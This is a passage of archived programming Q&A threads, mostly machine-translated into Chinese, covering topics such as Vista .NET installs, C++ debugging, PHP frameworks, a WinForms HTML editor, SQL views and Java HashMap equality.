是的，我也已经有一段时间了。并且绕圈子。上面的“msdn”可能是关键。但是，出去和谷歌打开Windows更新。我已经尝试过，并且我找到了另一个 MS 技术人员的信誉良好的论坛，其中包含使用命令行指令重命名和删除它的说明，以及 yadda ......害怕死这样做，因为这是一台主要的工作机器。为什么 MS 让这一切变得如此困难？在 20 年的计算生涯中，我从未遇到过 Vista 给我们造成的混乱。我无法打开 Windows 更新。而且我无法在这个论坛上安装 .NET 的东西。我需要的是.NET 3.5。但是遇到了这里谈到的同样的“错误”。卡住。MS 每天都在为 Vista 烦恼。我以为我 d 适应了大部分的复杂性，甚至非常满意......直到用 .NET 来解决这个问题。为什么没有准备好购买机器？我不记得曾经将 Windows 更新设置为不更新......所以所有这些都是一个棘手的问题。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2010-01-14T21:18:28.440

这个线程很旧，但我想我会添加一些东西

检查您是否没有安装 C++ Redist，如果是，请卸载并重试。为我工作。

# windows - 显示带有离开消息的屏幕保护程序

> ID：214103
> 
> 赞同：1
> 
> 时间：2008-10-17T22:55:08.407
> 
> 标签：windows, screensaver

我正在寻找一个应用程序，它可以锁定我的计算机并显示一个屏幕保护程序，其中包含我在锁定它时设置的离开消息。这个想法是，当我在工作期间离开某个地方时，我的同事会知道我要去哪里，而不是为我的空办公桌感到困惑。

这样的应用程序存在吗？

如果没有，我将如何制作这样的东西？

我有开发经验，但以前从未处理过屏幕保护程序或锁定窗口。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-17T23:18:19.420

我知道这并不是您真正想要的答案，但您是否考虑过只使用 Post-It™ Notes？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-17T23:24:20.593

为您的帐户设置密码。按 Windows+L 将锁定您的屏幕并需要您的密码才能重新进入。至于留言您可以使用字幕或 3D 文本屏幕保护程序来留言

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-17T22:58:27.667

大多数 Windows 版本都有选取框或 3D 文本屏幕保护程序，并为您提供“在恢复时，显示登录屏幕”选项。您可以只设置屏幕保护程序的文本以指示您在哪里以及为什么不在办公桌前，并且当您返回时，您必须输入密码才能恢复工作。这还不够吗？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-17T23:28:06.173

考虑只使用带有密码帐户的屏幕保护程序。让屏幕保护程序超时非常短......一分钟左右。

# c++ - 调试导致异常？

> ID：214109
> 
> 赞同：0
> 
> 时间：2008-10-17T22:57:44.033
> 
> 标签：c++, debugging, exception, visual-c++

我从在 Visual Studio 2k3 中使用 C++ 编写的应用程序中获取了错误数据，因此我决定对其进行调试。然后我发现它抛出了一个异常，但我无法追踪。

然后我放置了一些 try/catch 块，然后看，当我不调试时，没有异常。也就是说，我的代码如下所示：

```
`std::vector<MyClass*> ListOfStuff;
.
.
.
try
{
.
.
.
   const MyClass * localPointer = ListOfStuff[i]; //This is where the exception occurs
.
.
}
 catch (...)
{
   int x = 0;  //place break here
}` 
```

`因此，如果我逐行逐行执行代码，我会得到一个异常并抓住机会。但是，如果我只是让它在 catch 内的断点下运行，则不会发生任何事情。使用迭代器具有相同的行为。而且我可以成功检查向量的大小，所以我知道我在范围内。
谁能告诉我发生了什么事？如果重要的话，我正在使用一些标准的 Windows 库和 openGL。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-17T23:04:03.240

您可以尝试放置一个

```
DebugBreak(); 
```

在`catch`子句中调用。如果应用程序在调试器中运行，它应该获得控制权。如果它没有在调试器中运行，您应该有机会附加“及时”调试器（如果您安装了它，通常是 Visual Studio）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-17T23:32:23.510

我指的是VS2005，但它应该适用于您的情况。如果您访问 IDE **Debug** > **Exceptions..**菜单项，您可以指定 IDE 调试器在**抛出**时应该中断的异常类型，这应该会导致您在单步执行应用程序时看到引发异常的行。

您可能需要尝试捕获哪些类型（某些第一次机会异常实际上并不是问题），但这有助于确定引发异常的点。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-17T23:00:38.553

异常是断言吗？这些可能会在编译时编译出来，或者抛出一个断言。

例如，你可以有

```
#ifdef DEBUG
#define ASSERT(cond) if (cond) throw CDebugAssertionObj;
#else
#define ASSERT(cond)
#endif 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-18T02:16:52.040

Is that code part of a class method, and is `ListOfStuff` a member of the class? If so, check to make sure that your `this` pointer is valid.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-17T23:01:56.507

如果您使用的是允许条件断点的良好 IDE（例如，“如果 i == 5 则在此处中断”），那么条件本身可能会导致异常。

有一段时间了……当我找到它时，我的头很痛。

# php - 在预算网络主机上运行的好 php 框架？

> ID：214113
> 
> 赞同：7
> 
> 时间：2008-10-17T22:58:31.020
> 
> 标签：php, frameworks

我想创建一些使用 PHP 作为编程语言的小型网站。我查看了几个框架，但它们看起来都相当大，并且不确定它们在共享托管环境中运行的好坏。我想知道是否有人知道在共享主机中运行良好的框架？我正在寻找具有 MVC 和 ORM 功能的东西，其他任何额外的东西都会是一个奖励。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-10-17T23:08:36.540

ElisLabs codeigniter ( [http://codeigniter.com/](http://codeigniter.com/) ) 应该像手套一样符合要求。

当我做 php 项目时，这是我选择的框架。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-17T23:20:08.247

虽然我个人喜欢 CakePHP，并且我已经为在共享主机上运行的客户端完成了许多项目，并且运行良好，但如果轻量级对您来说真的很重要，那么 CodeIgniter 将是我的选择。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-10-17T23:11:00.573

蛋糕PHP。我不明白为什么它在共享主机中不起作用。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-18T04:20:27.470

正如已经提到的，CodeIgniter 是一个很棒的 PHP 框架。它有一个很棒的用户指南、社区和一个轻量级的足迹。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-18T08:35:11.527

再次为 CodeIgniter 投票 - 它真的很容易学习，而且非常轻量级，非常适合共享主机。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-10-18T17:30:49.697

由于您在谈论小型应用程序，因此可能无关紧要。CodeIgniter 似乎是最快的。

但是对于大型应用程序（或可能变得很大的应用程序（谈论负载，而不是代码数量）），我建议根本不要使用“通用”框架。它们可能会大大加快开发速度**，**但在大多数情况下，它们是真正的计算机能力杀手。

根据 - 例如 - [Paul M. Jones](http://paul-m-jones.com/?p=315)框架的一些测试占用了大约 90% 到 97% 的系统资源（CodeIgniter 仅占用 85% 就获得了不错的分数）。这意味着如果您的计算机可以使用框架每秒处理 100 个请求，那么在服务器启动之前您将只剩下 15 个可能的请求。

当然，结果会因应用而异。Paul 执行的测试是简单的“Hello World”页面，没有数据库，也没有其他计算。显然，如果添加应用程序逻辑，“应用程序/框架”的比例会发生很大变化。

不是试图阻止你使用框架......只是想让你在开始编码之前思考......

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-10-19T00:29:44.470

[Kohana](http://kohanaphp.com)也是一个不错的选择。它最初是从 CodeIgniter 分叉出来的，现在被重写为一个纯 PHP5、真正的开源项目，针对速度、快速开发和灵活性进行了优化。

旁注/披露，我最初参与了形成 Kohana 的分叉。CodeIgniter（至少大约一两年前，当我参与其中时）对用户贡献非常不开放。我有几个增强和错误修复，我为这些补丁提供了补丁，但最终都腐烂了，基本上，因为它们被忽略了*。结果，一些人对参与其中产生了极大的兴趣，虽然 Kohana 基于与 CodeIgniter 相同的原则和想法，但实现要好得多，并且更容易使用。

(*: 不是因为代码质量，只是不感兴趣，因为它不一定符合 Ellislabs 的直接发展方向，因为它是他们商业产品的支持。就像做了一个改变——即使它对库做出了巨大的改进——这将要求他们重写/更改他们在上面构建的任何东西，它也会被忽略。）

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-10-18T02:31:26.973

我真的很喜欢 CakePHP，它很简单并且有很好的文档。我已经在 MediaTemple 上很容易地设置它，我只需要更改配置文件中的 webroot 变量。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2012-08-28T05:14:07.553

[Qcodo](http://www.qcodo.com/)是另一个审查选项。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2011-05-18T01:08:18.300

看看索尼克。它的构建非常轻便和快速。核心框架不到 3000 行代码，你可以用一个 26kb 的文件创建一个完整的应用程序。

它设置了一个扩展框架，允许您在其上安装扩展（ORM、数据库、缓存等）。

查看网站： [http ://sonicframework.com](http://sonicframework.com)

浏览源：http: [//github.com/ccampbell/sonic](http://github.com/ccampbell/sonic)

# oop - 大型项目中的班级数量

> ID：214115
> 
> 赞同：2
> 
> 时间：2008-10-17T22:59:04.903
> 
> 标签：oop

我只是想知道大型项目 - 比如航空公司预订系统，它可能有多少类/对象。

对象：客户、飞机、机场、路线、机票、订单。这就是我能想到的。该项目可能会有数十万行代码，那么可能会有更多的类（做与对象无关的事情）吗？

如果是这样，可能（大约）有多少类？可能有多少对象（根据我的列表，不是 10,000 个客户对象，有多少不同的*名称*）？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-17T23:20:35.547

确实没有计算最佳类数的神奇公式。您上面描述的架构可能会创建一个非常非常简单的航空公司预订系统。随着您继续重构、添加更多功能并适应特殊情况，您最终可能会得到*更多*类，例如 MealPreference、CouponCode、Terminal、Gate、Airline、Baggage、BaggageTransfer、RainCheck、FlightUpgrade 等。

正如你应该做的那样（如果你想变得敏捷），只编写你当时需要的代码，提前计划以便于扩展。然而，随着时间的推移，任何项目都会以意想不到的方式增长。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-18T00:39:27.667

对于现实世界的航空公司预订系统？数千。容易地。

我猜其中大约有一半是“基础设施”类——主要与持久性、日志记录、集成等有关。可能有几百个域类（航空公司、飞机、航班、乘客、FrequentFlyer、MaintenanceSchedule、WeatherDelay 等）。然后其中一半将与 UI 相关 - 控制器、视图、视图模型等，以支持客户和内部应用程序。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-17T23:12:48.933

课程的数量只是统计数据，它知道它不会帮助您建立任何最佳实践，但我会说它可以用于数千个课程。

重要的是要牢记最佳实践和命名约定，重要的是要有一个良好的包结构并根据其目的命名你的类，还要记住你的类的高度凝聚力。

所以除了满足你的好奇心之外，这个数字并不重要。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-17T23:02:08.457

类的数量实际上与您构建的设计模式和架构有关。

例如，对于将两个数字相加的简单控制台应用程序，根据使用的实现和抽象，您可以有 1 到 10（粗略猜测）的任意值。

如果不了解架构和模式，您真的无法判断应用程序将包含多少“对象”。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-17T23:37:41.223

我同意它非常依赖于很多东西；代码语言、应用程序架构、第 3 方扩展的数量（通常包含许多实际上不会被应用程序调用但包含在 .dll 或 .jar 文件中的类），以及很多关于开发人员以及他们是否倾向于使用巨大的整体类，或者将所有内容分解为接口、抽象、简单/存根和实际实现。

但是，如果您只是在寻找统计数据，我最近正在为通用汽车公司开展一个大型项目，我会说大约有 3000 个类，加上 200 个 JSP 页面，以及几十个支持 UI 的 CSS 和 JS 文件。插入其中，您有 DB 驱动程序、Spring 框架、几个 apache 公共库、Hibernate ORM、Mule、JSTL，可能还有其他一些核心组件...... Web 服务器本身......

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-18T01:40:41.443

这完全取决于您使用的抽象。根据我的经验，你越是关注问题领域（你越是努力让你的代码读起来像商务人士所说的那样），你就会拥有越多的课程。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-31T07:13:41.773

您收到的所有其他答案都是明智的：基本上，“这取决于。”

但在另一种意义上，对于给定数量的方法，您应该拥有最佳数量的类；也就是说，给定许多方法，有特定数量的类（在非分层封装上下文中，并且非常接近），它们可以最大限度地减少这些方法的潜在结构复杂性。（实际数量由封装第二定律给出，等于方法数的平方根除以每个类的公共方法数）。

那么问题就变成了：你需要多少种方法？以此类推，其中方法被封装在类中，因此代码块被封装在方法中，因此方法的数量由上述相同的第二定律确定。

那么问题是：我将拥有多少个代码块？

您收到的其他回复已经回答了这一点：这取决于。

有关更多信息，请参阅此处的封装理论：www.EdmundKirwan.com

问候，

埃德。

# perspective - BPM 的价值是什么？（业务流程管理）值得用吗？在哪些情况下？

> ID：214122
> 
> 赞同：22
> 
> 时间：2008-10-17T23:01:08.817
> 
> 标签：perspective, business-process-management

我不是指每分钟的比特数，而是业务流程管理。

起初虽然 BPM 被高估了，因为该技术在某种程度上很容易解决，但我了解到 BPM 套件的价值在于让非技术的业务专家参与到软件设计中。

我知道，用户在分析过程中总是和我们在一起，但我们使用的工件对他们来说总是很陌生。无论UML图看起来多么友好，或者我们进行了多少敏捷迭代，最终用户和最终开发人员之间总是存在差距（通常由用户经理和IT经理覆盖：-S）

您（作为软件开发人员）如何看待 BPM？看起来很有趣吗？你会考虑学习其中之一吗？你认为5年后它会死吗？

我知道 BPM 根本不是灵丹妙药，但除非您有一个非常聪明的客户，他知道如何表达他们的要求让我们把它做好，否则分析和需求将永远是项目失败的地方。

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2008-10-18T00:51:21.590

I spent a couple years in the Content Management/Information Management circle using both FileNet and IBM BPM products. I would have to say I am incredibly unimpressed, and here is why:

1) BPM is one of those things I have not ever seen implemented intuitively. By that I mean (similar to what you say in your question) that a business user cannot sit down, and with 30 minutes create a process/workflow.

2) I have rarely seen a non-programmer be able to create acceptable solutions

3) The lack of ability to explain BPM to business users, the inability of business users to comprehend, and the amount of time and money spent on BPM seems ludicrous to me. From experience in everything I have been involved in, the company could hire 1 or 2 people (technical types) to work full time and create them a custom app for the time it takes a bunch of business types to have numerous meetings and hire consultants or train business people.

4) It is an incredibly niche market, and 90% of the outcome involves document routing and approvals. This is a VERY VERY simple concept, and one which a developer can usually code and implement a solution for much cheaper. If the developer is good, they can make it much more intuitive with less steps too.

5) It usually takes longer to have a coder talk with 10 people in management, a bunch of business users, learn to use a bad limited product and come up with a solution than it would be just to let normal development go on.

Don't get me wrong here - I know my experience, while quite deep compared to some, only deals with a couple products meaning I have only touched a little of what is out there. I am all in favor of innovation, but I haven't yet seen a halfway decent solution, and they all cost 20 times more than they are worth. I am sure COTS BPM type software will persist, but I hope I don't have to work with it for many more years. Hopefully then it will be halfway decent.

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2008-10-17T23:33:32.620

我认为 BPM 与“保持计算机运行”的传统 IT 单元正交，因为 BPM 是我们尝试通过添加这项技术或相应地更改流程来改进工作方式的地方。我觉得它在几个方面相当迷人。

对我来说另一个有趣的部分是，这往往涉及查看业务的不同部分，例如销售团队如何工作、营销、人力资源等，并试图了解他们的效率以及事情在哪里改善？

我认为它不会消亡，但名称的含义会发生变化和发展，我怀疑其中一个分支可能是自动化业务专家或其他名称。我也确实看到这与公司 IT 部门的应用程序组合的想法相结合。应用程序会定期进行改进或更换，以改进事物的工作方式，并具有持续改进的价值。

不要忘记，我们这些 IT 部门的人经常光顾这个网站。我可能是一名网络开发人员，但根据公司的不同，这可能有几个不同的角度：1）产品开发——在这里我帮助制造产品或促进公司销售的服务，2）信息技术——在这里我帮助公司通过了解公司的骨干来运营，公司的骨干是一组机器和各种软件，这些软件通过各种流程缝合在一起，以实现公司的运营。

The evolution of requirements and the technologies that can help meet those requirements are usually a couple of big things that can impact any large software integration like an ERP or CRM system. In taking years to get the software installed and the company using it correctly, there will likely be many changes as to how we thought it would work to this is how we actually use it, where not all changes are bad. It may be that by removing some part a company could save thousands of dollars on the man hours that would be spent on something that isn't really needed or useful but this wasn't known at the start and thus one of the requested features is removed from the list of things wanted at the end.

# c# - winforms html 编辑器

> ID：214124
> 
> 赞同：31
> 
> 时间：2008-10-17T23:01:46.007
> 
> 标签：c#, .net, html, winforms

任何人都知道 .NET 的一个很好的免费 winforms html 编辑器。理想情况下，我想要 html 和预览模式以及导出为 pdf、word doc 或类似文件的可能性。

虽然导出我可能可以从 html 输出中创建自己。

另一个不错的功能是从 word 中粘贴，它会删除您通常最终使用的所有额外标签，但再次使用它是一个很好的选择。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2008-10-17T23:13:53.690

您可以在设计模式下使用[WebBrowser](https://docs.microsoft.com/en-us/dotnet/framework/winforms/controls/webbrowser-control-windows-forms)`WebBrowser`控件和在视图模式下设置的第二个控件。

为了将`WebBrowser`控件置于设计模式，您可以使用以下代码。

此代码是我们的一个软件产品的 WYSIWYG 编辑器的超级精简版。

只需创建一个新表单，`WebBrowser`在其上放置一个控件，然后将其放入 Form.Load：

```
Me.WebBrowser1.Navigate("")
Application.DoEvents()
Me.WebBrowser1.Document.OpenNew(False).Write("<html><body><div id=""editable"">Edit this text</div></body></html>")

'turns off document body editing
For Each el As HtmlElement In Me.WebBrowser1.Document.All
    el.SetAttribute("unselectable", "on")
    el.SetAttribute("contenteditable", "false")
Next

'turns on editable div editing
With Me.WebBrowser1.Document.Body.All("editable")
    .SetAttribute("width", Me.Width & "px")
    .SetAttribute("height", "100%")
    .SetAttribute("contenteditable", "true")
End With

'turns on edit mode
Me.WebBrowser1.ActiveXInstance.Document.DesignMode = "On"
'stops right click->Browse View
Me.WebBrowser1.IsWebBrowserContextMenuEnabled = False 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2011-09-21T21:54:45.550

```
//CODE in C#
webBrowser1.Navigate("about:blank");
Application.DoEvents();
webBrowser1.Document.OpenNew(false).Write("<html><body><div id=\"editable\">Edit this text</div></body></html>"); 

foreach (HtmlElement el in webBrowser1.Document.All)
{
    el.SetAttribute("unselectable", "on");
    el.SetAttribute("contenteditable", "false");
}

webBrowser1.Document.Body.SetAttribute("width", this.Width.ToString() + "px");    
webBrowser1.Document.Body.SetAttribute("height", "100%");     
webBrowser1.Document.Body.SetAttribute("contenteditable", "true");
webBrowser1.Document.DomDocument.GetType().GetProperty("designMode").SetValue(webBrowser1.Document.DomDocument, "On", null);
webBrowser1.IsWebBrowserContextMenuEnabled = false; 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-07-22T12:33:14.497

我正在考虑使用 Lutz Roeder 的 Writer（以 Reflector 闻名）。一个完全用 C# 编写的基本 Html 编辑器，按原样提供源代码。[在http://www.lutzroeder.com/dotnet/](http://www.lutzroeder.com/dotnet/)上寻找它

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-06-30T05:20:11.220

SpiceLogic .NET WinForms HTML 编辑器控件，不是免费的，但它涵盖了您正在寻找的一切。特别是，**从 MS word 中粘贴**功能非常有效。单击 MS Word 粘贴按钮会将内容从剪贴板粘贴到编辑器，并清理 ms word 特定标签并生成干净的 XHTML。如果 MS Word 包含一些图像，此编辑器也会检测这些图像，并且输出 XHTML 将包含图像标记以及这些图像的正确路径。

[https://www.spicelogic.com/Products/NET-WinForms-HTML-Editor-Control-8](https://www.spicelogic.com/Products/NET-WinForms-HTML-Editor-Control-8)

![在此处输入图像描述](https://i.stack.imgur.com/u3LM9.png)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-29T15:12:15.920

请参阅[http://www.maconstateit.net/tutorials/JSDHTML/JSDHTML12/jsdhtml12-02.htm](http://www.maconstateit.net/tutorials/JSDHTML/JSDHTML12/jsdhtml12-02.htm)以获取在 IE 中使用编辑支持的示例 HTML 编辑器。

[http://www.mozilla.org/editor/midasdemo/](http://www.mozilla.org/editor/midasdemo/)和[http://starkravingfinkle.org/blog/wp-content/uploads/2007/07/contenteditable.htm](http://starkravingfinkle.org/blog/wp-content/uploads/2007/07/contenteditable.htm)也适用于 IE，并给出了如何做的例子工具栏，用于字体、粗体、斜体等

* * *

当我尝试这样做时，请参阅这些问题以了解我的经验。

*   [在 IE 中使用 contentEditable 的风险](https://stackoverflow.com/questions/491790/risk-of-using-contenteditable-in-ie)
*   [为什么 ContentEditable 从 div 中删除“ID”](https://stackoverflow.com/questions/527866/why-is-contenteditable-removing-id-from-div)

我还有很多其他问题，包括必须在 jscript 中编写调整大小逻辑以使 HTML 编辑器与 WinForm 表单一起调整大小，并且必须将默认表单/控制颜色传递给 HTML 编辑器，以便它看起来写然后用户改变Windows 上的配色方案。

**因此，如果我需要再次执行此操作，我会使用第 3 方 HTML 编辑器（免费或付费）**

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-07-14T05:09:25.353

[如果你只需要简单地格式化一些文本，你可以在codeproject.com](https://www.codeproject.com/)上找到很多开源项目。

我认为 Netrix 的功能是所有这些免费控件中最全面的。链接如下： [https ://github.com/joergkrause/netrix](https://github.com/joergkrause/netrix)

当然，也有一些付费的商业控件，通常会提供更友好的界面和更丰富的功能，比如这个[BaiqiSoft.HtmlEditor](http://www.mysofttool.com/net-winforms-html-editor-control)。**它允许我合并/取消合并单元格，调整插入表格的行高和列宽。**

# .net - 如何更改 Properties.Settings 的默认路径

> ID：214131
> 
> 赞同：3
> 
> 时间：2008-10-17T23:03:12.447
> 
> 标签：.net, properties.settings

每当我这样做`Properties.Settings.Save()`时，它都会提交属性更改，`Application.LocalUserAppDataPath`但我希望路径是`Application.CommonAppDataPath`。

在哪里

```
Application.CommonAppDataPath = 
C:\Documents and Settings\**All Users**\Application Data\xxxxx\xxxx\1.0.0.0

Application.LocalUserAppDataPath =
C:\Documents and Settings\**gsankar**\Local Settings\Application Data\xxxxx\xxxx\1.0.0.0 
```

请让我知道是否可以更改。如果是这样，请告诉我如何？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-07-27T13:15:09.987

`Properties.Settings.Default.ParentPath = Application.CommonAppDataPath;`调用前使用`Properties.Settings.Save();`。

# sql - 视图有什么用？

> ID：214132
> 
> 赞同：94
> 
> 时间：2008-10-17T23:03:55.673
> 
> 标签：sql, view, rdbms-agnostic

我只是想大致了解 RDBMS 中使用的视图。也就是说，我知道什么是视图以及如何制作视图。我也知道我过去用它们做什么。

但我想确保我对视图的用途和视图不应该用于的用途有透彻的了解。进一步来说：

1.  视图有什么用？
2.  有没有在你不应该使用视图的情况下使用视图很诱人？
3.  为什么要使用视图来代替表值函数之类的东西，反之亦然？
4.  是否存在乍一看并不明显的视图可能有用的任何情况？

（为了记录，其中一些问题是故意幼稚的。这部分是概念检查。）

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2008-10-17T23:08:20.923

在某种程度上，视图就像一个界面。您可以随心所欲地更改基础表结构，但视图提供了一种不必更改代码的方法。

视图是为报告作者提供简单内容的好方法。如果您的业务用户想要从诸如 Crystal Reports 之类的东西访问数据，您可以在他们的帐户中为他们提供一些简化数据的视图——甚至可以为他们进行非规范化。

* * *

## 回答 #2

> 赞同：44
> 
> 时间：2008-10-18T00:14:25.830

*1) What is a view useful for?*

> **IOPO** In One Place Only
> 
> •Whether you consider the data itself or the queries that reference the joined tables, utilizing a view avoids unnecessary redundancy.
> 
> •Views also provide an abstracting layer preventing direct access to the tables (and the resulting handcuffing referencing physical dependencies). In fact, I think it's *good practice*¹ to offer only abstracted access to your underlying data (using views & table-valued functions), including views such as
> 
> `CREATE VIEW AS
>       SELECT * FROM tblData`
> 
> ¹I hafta admit there's a good deal of "Do as I say; not as I do" in that advice ;)

*2) Are there any situations in which it is tempting to use a view when you shouldn't use one?*

> Performance in view joins used to be a concern (e.g. SQL 2000). I'm no expert, but I haven't worried about it in a while. (Nor can I think of where I'm presently using view joins.)
> 
> Another situation where a view might be overkill is when the view is only referenced from one calling location and a derived table could be used instead. Just like an anonymous type is preferable to a class in .NET if the anonymous type is only used/referenced once.
> 
>     • See the derived table description in   http://msdn.microsoft.com/en-us/library/ms177634.aspx

*3) Why would you use a view in lieu of something like a table-valued function or vice versa?*

> (Aside from performance reasons) A table-valued function is functionally equivalent to a parameterized view. In fact, a common simple table-valued function use case is simply to add a WHERE clause filter to an already existing view in a single object.

*4) Are there any circumstances that a view might be useful that aren't apparent at first glance?*

> I can't think of any non-apparent uses of the top of my head. (I suppose if I could, that would make them apparent ;)

* * *

## 回答 #3

> 赞同：22
> 
> 时间：2008-10-17T23:09:25.553

视图可用于提供安全性（即：用户可以访问仅访问表中某些列的视图），视图可以为更新、插入等提供额外的安全性。视图还提供了一种为列名取别名的方法（如sp's) 但视图更像是与实际表的隔离。

* * *

## 回答 #4

> 赞同：19
> 
> 时间：2008-10-17T23:36:40.447

从某种意义上说，视图是非规范化的。有时需要非规范化以更有意义的方式提供数据。无论如何，这就是许多应用程序通过在其对象中进行域建模所做的事情。它们有助于以更符合企业观点的方式呈现数据。

* * *

## 回答 #5

> 赞同：11
> 
> 时间：2008-10-17T23:55:16.493

In addition to what the others have stated, views can also be useful for removing more complecated SQL queries from the application.

As an example, instead of in an application doing:

> sql = "select a, b from table1 union select a, b from table2";

You could abstract that to a view:

> create view union_table1_table2_v as
> select a,b from table1
> union
> select a,b from table2

and in the app code, simply have:

> sql = "select a, b from union_table1_table2_v";

Also if the data structures ever change, you won't have to change the app code, recompile, and redeploy. you would just change the view in the db.

* * *

## 回答 #6

> 赞同：11
> 
> 时间：2008-10-18T01:23:38.123

Views hide the database complexity. They are great for a lot of reasons and are useful in a lot of situations, but if you have users that are allowed to write their own queries and reports, you can use them as a safeguard to make sure they don't submit badly designed queries with nasty cartesian joins that take down your database server.

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2008-10-17T23:56:15.583

The OP asked if there were situations where it might be tempting to use a view, but it's not appropriate.

What you don't want to use a view for is a substitute for complex joins. That is, don't let your procedural programming habit of breaking a problem down into smaller pieces lead you toward using several views joined together instead of one larger join. Doing so will kill the database engine's efficiency since it's essentially doing several separate queries rather than one larger one.

For example, let's say you have to join tables A, B, C, and D together. You may be tempted to make a view out of tables A & B and a view out of C & D, then join the two views together. It's much better to just join A, B, C, and D in one query.

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2008-10-17T23:53:16.043

视图可以集中或整合数据。在我所在的地方，我们在几个不同的链接服务器上有许多不同的数据库。每个数据库都保存不同应用程序的数据。其中一些数据库包含与许多不同应用程序相关的信息。在这种情况下，我们要做的是在该应用程序的数据库中创建一个视图，该视图只是从真正存储数据的数据库中提取数据，这样我们编写的查询看起来就不会跨越不同的数据库。

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2008-10-18T00:07:07.887

The responses so far are correct -- views are good for providing security, denormalization (although there is much pain down that road if done wrong), data model abstraction, etc.

In addition, views are commonly used to implement business logic (a lapsed user is a user who has not logged in in the last 40 days, that sort of thing).

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2008-10-18T20:09:51.497

Views save a lot of repeated complex JOIN statements in your SQL scripts. You can just encapsulate some complex JOIN in some view and call it in your SELECT statement whenever needed. This would sometimes be handy, straight forward and easier than writing out the join statements in every query.

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2010-10-01T14:31:04.797

A view is simply a stored, named SELECT statement. Think of views like library functions.

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2008-10-18T00:08:07.870

I wanted to highlight the use of views for reporting. Often, there is a conflict between normalizing the database tables to speed up performance, especially for editing and inserting data (OLTP uses), and denormalizing to reduce the number of table joins for queries for reporting and analysis (OLAP uses). Of necessity, OLTP usually wins, because data entry must have optimal performance. Creating views, then, for optimal reporting performance, can help to satisfy both classes of users (data entry and report viewers).

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2008-10-21T17:33:43.110

I remember a very long SELECT which involved several UNIONs. Each UNION included a join to a price table which was created on the fly by a SELECT that was itself fairly long and hard to understand. I think it would have been a good idea to have a view that to create the price table. It would have shortened the overall SELECT by about half.

I don't know if the DB would evaluate the view once, or once each time in was invoked. Anyone know? If the former, using a view would improved performance.

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2016-08-15T19:49:39.433

Anytime you need [my_interface] != [user_interface].

Example:

TABLE A:

*   id
*   info

VIEW for TABLE A:

*   Customer Information

this is a way you might hide the id from the customer and rename the info to a more verbose name both at once.

The view will use underlying index for primary key id, so you won't see a performance loss, just better abstraction of the select query.

# java - 为什么不允许外部接口为 HashMap 提供 hashCode/equals？

> ID：214136
> 
> 赞同：14
> 
> 时间：2008-10-17T23:06:24.920
> 
> 标签：java, collections, hashmap, trove4j

使用 a`TreeMap`提供 custom 是微不足道的`Comparator`，从而覆盖`Comparable`添加到地图的对象提供的语义。`HashMap`但是不能以这种方式控制 s；提供散列值和相等性检查的函数不能被“侧载”。

我怀疑设计一个界面并将其改造成`HashMap`（或一个新类）既容易又有用？像这样的东西，除了更好的名字：

```
 interface Hasharator<T> {
    int alternativeHashCode(T t);
    boolean alternativeEquals(T t1, T t2);
  }

  class HasharatorMap<K, V> {
    HasharatorMap(Hasharator<? super K> hasharator) { ... }
  }

  class HasharatorSet<T> {
    HasharatorSet(Hasharator<? super T> hasharator) { ... }
  } 
```

[不区分大小写`Map`](https://stackoverflow.com/questions/212562/is-there-a-good-way-to-have-a-mapstring-get-and-put-ignore-case)的问题得到了一个简单的解决方案：

```
 new HasharatorMap(String.CASE_INSENSITIVE_EQUALITY); 
```

这是否可行，或者你能看到这种方法的任何基本问题吗？

是否在任何现有（非 JRE）库中使用了该方法？（试过谷歌，没有运气。）

编辑：hazzen 提出了很好的解决方法，但恐怕这是我试图避免的解决方法...... ;)

编辑：将标题更改为不再提及“比较器”；我怀疑这有点令人困惑。

编辑：接受与性能相关的答案；会喜欢更具体的答案！

编辑：有一个实现；请参阅下面接受的答案。

编辑：改写第一句以更清楚地表明这是我所追求的侧载（而不是排序；排序不属于 HashMap）。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-10-17T23:40:48.160

.NET 通过 IEqualityComparer（对于可以比较两个对象的类型）和 IEquatable（对于可以将自身与另一个实例进行比较的类型）来实现这一点。

